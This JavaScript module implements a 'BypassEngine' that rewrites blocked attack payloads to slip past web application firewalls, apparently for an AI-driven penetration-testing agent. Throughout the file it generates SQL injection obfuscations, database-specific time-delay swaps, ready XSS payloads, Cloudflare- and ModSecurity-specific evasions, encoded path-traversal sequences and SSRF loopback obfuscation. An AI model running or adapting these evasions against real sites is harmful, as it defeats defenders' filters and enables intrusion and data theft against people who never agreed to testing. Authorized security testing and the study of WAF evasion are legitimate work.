/**
 * Bypass technique engine for WAF/filter evasion
 * Pure utility — generates encoding-based and technique-based bypasses
 * without making separate LLM calls.
 *
 * Provides:
 * - Encoding bypasses (URL, double-URL, Unicode, hex)
 * - Syntax bypasses (case variation, comment injection, whitespace substitution)
 * - Technology-specific bypass suggestions
 * - Tracking of blocked payloads and successful bypasses
 */
export class BypassEngine {
  /**
   * @param {number} [maxAttempts=10] - Maximum bypass attempts before giving up
   */
  constructor(maxAttempts = 10) {
    this.attemptCount = 0;
    this.maxAttempts = maxAttempts;
    this.blockedPayloads = [];
    this.successfulBypass = null;
  }

  /**
   * Generate bypass variations for a blocked payload.
   * Uses deterministic encoding and transformation techniques (no LLM needed).
   *
   * @param {string} blockedPayload - The payload that was blocked
   * @param {object} blockingContext - Information about why it was blocked
   * @param {object} vulnerability - Vulnerability context
   * @param {object} techContext - Technology context (DB, WAF, etc.)
   * @returns {object} Bypass suggestions with context
   */
  generateBypasses(blockedPayload, blockingContext, vulnerability, techContext) {
    this.blockedPayloads.push({
      payload: blockedPayload,
      context: blockingContext,
      timestamp: Date.now()
    });

    const vulnType = vulnerability.vulnerabilityType || vulnerability.type || 'injection';

    // Generate encoding-based bypasses
    const encodingBypasses = this._getEncodingBypasses(blockedPayload);

    // Generate technique-based bypasses
    const techniqueBypasses = this._getTechniqueBypasses(blockedPayload, vulnType, techContext);

    // Generate WAF-specific bypasses
    const wafBypasses = this._getWAFBypasses(blockedPayload, blockingContext, vulnType);

    // Merge and deduplicate — technique/WAF bypasses first (most targeted)
    const allBypasses = [...new Set([
      ...techniqueBypasses,
      ...wafBypasses,
      ...encodingBypasses
    ])];

    // Filter out previously blocked payloads
    const blockedSet = new Set(this.blockedPayloads.map(b => b.payload));
    const freshBypasses = allBypasses.filter(b => !blockedSet.has(b));

    this.attemptCount += freshBypasses.length;

    // Build guidance for the LLM
    const guidance = this._buildBypassGuidance(blockingContext, techContext, vulnType);

    return {
      bypasses: freshBypasses.slice(0, this.maxAttempts - this.attemptCount + freshBypasses.length),
      guidance,
      techniques: this._describeAppliedTechniques(blockingContext, vulnType),
      blockedHistory: this.blockedPayloads.slice(-5).map(b => b.payload),
      attemptsUsed: this.attemptCount,
      attemptsRemaining: Math.max(0, this.maxAttempts - this.attemptCount)
    };
  }

  // ---------------------------------------------------------------------------
  // Encoding bypasses
  // ---------------------------------------------------------------------------

  /**
   * @private
   */
  _getEncodingBypasses(payload) {
    const bypasses = [];

    // URL encoding
    bypasses.push(encodeURIComponent(payload));

    // Double URL encoding
    bypasses.push(encodeURIComponent(encodeURIComponent(payload)));

    // Explicit percent-encoding for chars encodeURIComponent misses (' ( ))
    const manualPctPayload = payload
      .replace(/'/g, '%27')
      .replace(/\(/g, '%28')
      .replace(/\)/g, '%29');
    if (manualPctPayload !== payload) {
      bypasses.push(manualPctPayload);
    }

    // Unicode encoding for key characters
    const unicodePayload = payload
      .replace(/'/g, '%u0027')
      .replace(/"/g, '%u0022')
      .replace(/</g, '%u003c')
      .replace(/>/g, '%u003e');
    if (unicodePayload !== payload) {
      bypasses.push(unicodePayload);
    }

    // HTML entity encoding
    const htmlPayload = payload
      .replace(/'/g, '&#39;')
      .replace(/"/g, '&#34;')
      .replace(/</g, '&#60;')
      .replace(/>/g, '&#62;');
    if (htmlPayload !== payload) {
      bypasses.push(htmlPayload);
    }

    // Hex encoding for key characters
    const hexPayload = payload
      .replace(/'/g, '\\x27')
      .replace(/"/g, '\\x22')
      .replace(/</g, '\\x3c')
      .replace(/>/g, '\\x3e');
    if (hexPayload !== payload) {
      bypasses.push(hexPayload);
    }

    return bypasses;
  }

  // ---------------------------------------------------------------------------
  // Technique bypasses
  // ---------------------------------------------------------------------------

  /**
   * @private
   */
  _getTechniqueBypasses(payload, vulnType, techContext) {
    const bypasses = [];

    if (vulnType === 'injection' || vulnType === 'command_injection') {
      // Case variation
      bypasses.push(this._randomCase(payload));

      // Comment injection (SQL)
      bypasses.push(payload.replace(/ /g, '/**/'));
      bypasses.push(payload.replace(/ /g, '%09')); // Tab
      bypasses.push(payload.replace(/ /g, '%0a')); // Newline

      // Alternate comment terminators
      if (payload.includes('--')) {
        bypasses.push(payload.replace(/--/g, '#'));
        bypasses.push(payload.replace(/--/g, '/*'));
      }

      // String concatenation (SQL)
      if (payload.includes("'")) {
        bypasses.push(payload.replace(/'([^']+)'/g, "'$1'||''"));
        bypasses.push(payload.replace(/SELECT/gi, 'SEL' + '/**/ECT'));
        bypasses.push(payload.replace(/UNION/gi, 'UNI' + '/**/ON'));
      }

      // Database-specific alternatives
      if (techContext.database) {
        const db = techContext.database.toLowerCase();
        if (db.includes('mysql')) {
          bypasses.push(payload.replace(/ /g, '/*!*/'));
          bypasses.push(payload.replace(/SLEEP\((\d+)\)/gi, 'BENCHMARK(10000000,SHA1(1))'));
        } else if (db.includes('postgres')) {
          bypasses.push(payload.replace(/SLEEP\((\d+)\)/gi, 'PG_SLEEP($1)'));
          bypasses.push(payload.replace(/--/g, '--/*'));
        } else if (db.includes('mssql') || db.includes('sql server')) {
          bypasses.push(payload.replace(/SLEEP\((\d+)\)/gi, "WAITFOR DELAY '0:0:$1'"));
        }
      }
    }

    if (vulnType === 'xss') {
      // Tag variations
      bypasses.push(payload.replace(/<script>/gi, '<ScRiPt>'));
      bypasses.push(payload.replace(/<script>/gi, '<script/x>'));
      bypasses.push(payload.replace(/alert\(/gi, 'prompt('));
      bypasses.push(payload.replace(/alert\(/gi, 'confirm('));
      bypasses.push(payload.replace(/<img/gi, '<IMG'));
      bypasses.push(payload.replace(/onerror/gi, 'ONERROR'));

      // Alternative event handlers
      if (payload.includes('onerror')) {
        bypasses.push(payload.replace(/onerror/gi, 'onload'));
        bypasses.push(payload.replace(/onerror/gi, 'onfocus'));
      }

      // SVG-based alternatives
      if (payload.includes('<script>')) {
        bypasses.push(payload.replace(/<script>([^<]+)<\/script>/gi, '<svg onload=$1>'));
        bypasses.push(payload.replace(/<script>([^<]+)<\/script>/gi, '<body onload=$1>'));
        bypasses.push(payload.replace(/<script>([^<]+)<\/script>/gi, '<details open ontoggle=$1>'));
      }
    }

    if (vulnType === 'traversal') {
      // Different traversal encodings
      bypasses.push(payload.replace(/\.\.\//g, '..%2f'));
      bypasses.push(payload.replace(/\.\.\//g, '%2e%2e%2f'));
      bypasses.push(payload.replace(/\.\.\//g, '%2e%2e/'));
      bypasses.push(payload.replace(/\.\.\//g, '..%252f'));
      bypasses.push(payload.replace(/\.\.\//g, '....//'));
      bypasses.push(payload.replace(/\.\.\//g, '..;/'));

      // Null byte
      bypasses.push(payload + '%00');
      bypasses.push(payload + '%00.jpg');
    }

    if (vulnType === 'ssrf') {
      // IP obfuscation
      bypasses.push(payload.replace(/127\.0\.0\.1/g, '2130706433')); // Decimal
      bypasses.push(payload.replace(/127\.0\.0\.1/g, '0x7f000001')); // Hex
      bypasses.push(payload.replace(/127\.0\.0\.1/g, '0177.0.0.1')); // Octal
      bypasses.push(payload.replace(/localhost/gi, '127.0.0.1'));
      bypasses.push(payload.replace(/127\.0\.0\.1/g, '[::1]'));

      // Protocol variations
      if (payload.startsWith('http://')) {
        bypasses.push(payload.replace('http://', 'https://'));
        bypasses.push(payload.replace('http://', 'gopher://'));
      }
    }

    return bypasses.filter(b => b !== payload); // Remove unchanged entries
  }

  // ---------------------------------------------------------------------------
  // WAF-specific bypasses
  // ---------------------------------------------------------------------------

  /**
   * @private
   */
  _getWAFBypasses(payload, blockingContext, vulnType) {
    const bypasses = [];
    const waf = (blockingContext.wafName || blockingContext.waf || '').toLowerCase();

    if (waf.includes('cloudflare')) {
      // Cloudflare-specific bypasses
      if (vulnType === 'xss') {
        bypasses.push(`<svg/onload=alert(1)>`);
        bypasses.push(`<details/open/ontoggle=alert(1)>`);
        bypasses.push(`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`);
      }
      if (vulnType === 'injection') {
        bypasses.push(payload.replace(/ /g, '%0a'));
        bypasses.push(payload.replace(/UNION SELECT/gi, 'UNION%0aSELECT'));
      }
    }

    if (waf.includes('modsecurity') || waf.includes('mod_security')) {
      // ModSecurity bypasses
      if (vulnType === 'injection') {
        bypasses.push(payload.replace(/ /g, '/**/'));
        bypasses.push(payload.replace(/'/g, '%bf%27')); // GBK encoding
      }
      if (vulnType === 'xss') {
        bypasses.push(`<a href="javascript:alert(1)">`);
        bypasses.push(`<input onfocus=alert(1) autofocus>`);
      }
    }

    // Generic WAF bypasses
    if (blockingContext.httpStatus === 403 || blockingContext.httpStatus === 406) {
      // Try with different content types
      bypasses.push(payload); // Same payload, different Content-Type suggested
      // Chunked transfer encoding hint
      bypasses.push(payload.split('').join(String.fromCharCode(0))); // Null byte insertion
    }

    return bypasses;
  }

  // ---------------------------------------------------------------------------
  // Guidance generation
  // ---------------------------------------------------------------------------

  /**
   * @private
   */
  _buildBypassGuidance(blockingContext, techContext, vulnType) {
    let guidance = 'Bypass suggestions based on blocking analysis:\n\n';

    if (blockingContext.httpStatus === 403) {
      guidance += '- HTTP 403 suggests WAF or authorization blocking.\n';
      guidance += '- Try encoding payloads (URL, double-URL, Unicode).\n';
      guidance += '- Try splitting the payload across multiple parameters.\n';
      guidance += '- Try different HTTP methods (GET vs POST).\n';
    }

    if (blockingContext.httpStatus === 400) {
      guidance += '- HTTP 400 suggests input validation rejecting the payload.\n';
      guidance += '- Try encoding special characters.\n';
      guidance += '- Try shorter, simpler payloads first.\n';
    }

    if (blockingContext.wafDetected || blockingContext.wafName) {
      const waf = blockingContext.wafName || 'Unknown WAF';
      guidance += `- WAF detected: ${waf}\n`;
      guidance += '- Try obfuscation techniques (case variation, comment injection).\n';
      guidance += '- Try alternative payload syntax that achieves the same goal.\n';
      guidance += '- Try chunked or multipart request encoding.\n';
    }

    if (techContext.database) {
      guidance += `\n- Database: ${techContext.database}\n`;
      guidance += `- Use ${techContext.database}-specific syntax and functions.\n`;
    }

    if (vulnType === 'xss') {
      guidance += '\n- Try event handlers instead of <script> tags.\n';
      guidance += '- Try SVG/MathML elements for DOM insertion.\n';
      guidance += '- Check if payload is reflected in a JavaScript context.\n';
    }

    if (vulnType === 'injection') {
      guidance += '\n- Try time-based blind injection if error-based is blocked.\n';
      guidance += '- Use stacked queries with different separators.\n';
      guidance += '- Try hex-encoded string literals.\n';
    }

    return guidance;
  }

  /**
   * @private
   */
  _describeAppliedTechniques(blockingContext, vulnType) {
    const techniques = [
      'URL encoding',
      'Double URL encoding',
      'Unicode encoding',
      'HTML entity encoding',
      'Hex encoding'
    ];

    if (vulnType === 'injection' || vulnType === 'command_injection') {
      techniques.push('Case variation', 'Comment injection (/**/)', 'Whitespace substitution', 'String concatenation');
    }
    if (vulnType === 'xss') {
      techniques.push('Tag variation', 'Event handler substitution', 'SVG/MathML alternatives');
    }
    if (vulnType === 'traversal') {
      techniques.push('Dot-encoding', 'Double-encoding', 'Null byte', 'Semicolon bypass');
    }
    if (vulnType === 'ssrf') {
      techniques.push('IP obfuscation (decimal/hex/octal)', 'IPv6', 'Protocol variation');
    }

    return techniques;
  }

  // ---------------------------------------------------------------------------
  // Helpers
  // ---------------------------------------------------------------------------

  /**
   * Randomly vary character casing
   * @private
   */
  _randomCase(str) {
    return str.split('').map((c, i) =>
      i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()
    ).join('');
  }

  /**
   * Check if bypass attempts exhausted
   * @returns {boolean}
   */
  isExhausted() {
    return this.attemptCount >= this.maxAttempts;
  }

  /**
   * Get total attempts made
   * @returns {number}
   */
  getTotalAttempts() {
    return this.attemptCount;
  }

  /**
   * Record successful bypass
   * @param {string} payload
   * @param {string} technique
   */
  recordSuccess(payload, technique) {
    this.successfulBypass = { payload, technique, timestamp: Date.now() };
  }

  /**
   * Get successful bypass if any
   * @returns {object|null}
   */
  getSuccessfulBypass() {
    return this.successfulBypass;
  }

  /**
   * Reset the engine state
   */
  reset() {
    this.attemptCount = 0;
    this.blockedPayloads = [];
    this.successfulBypass = null;
  }
}

/**
 * Create bypass engine
 * @param {number} [maxAttempts=10]
 * @returns {BypassEngine}
 */
export function createBypassEngine(maxAttempts = 10) {
  return new BypassEngine(maxAttempts);
}
